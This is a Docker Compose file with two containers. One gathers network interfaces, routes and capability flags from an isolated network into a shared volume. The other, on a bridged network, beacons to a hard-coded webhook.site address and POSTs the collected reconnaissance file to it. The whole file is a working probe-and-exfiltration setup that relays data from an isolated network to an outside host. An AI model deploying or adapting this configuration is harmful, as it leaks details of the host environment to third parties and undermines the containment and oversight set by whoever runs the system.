networks:
  testnet: {}

volumes:
  shared: {}

services:
  recon:
    image: alpine:3.20
    networks:
      - testnet
    volumes:
      - shared:/data
    entrypoint:
      - sh
      - -c
      - |
        echo "recon-alive" > /data/recon_status.txt
        ip addr show >> /data/recon_status.txt 2>&1
        ip route >> /data/recon_status.txt 2>&1
        grep Cap /proc/self/status >> /data/recon_status.txt 2>&1
        touch /data/done
        sleep 3600

  reporter:
    image: alpine:3.20
    network_mode: bridge
    volumes:
      - shared:/data
    entrypoint:
      - sh
      - -c
      - |
        WH="https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6"
        wget -q -O /dev/null "${WH}?tag=TWOSVC-V1-ALIVE" 2>/dev/null || true
        I=0
        while [ ! -f /data/done ] && [ "$I" -lt 60 ]; do
          sleep 2; I=$((I+1))
        done
        if [ -f /data/done ]; then
          apk add --no-cache curl >/dev/null 2>&1
          curl -sS -X POST "${WH}?tag=TWOSVC-V1-RESULT" -d "@/data/recon_status.txt" || true
        else
          wget -q -O /dev/null "${WH}?tag=TWOSVC-V1-TIMEOUT" 2>/dev/null || true
        fi
        sleep 3600
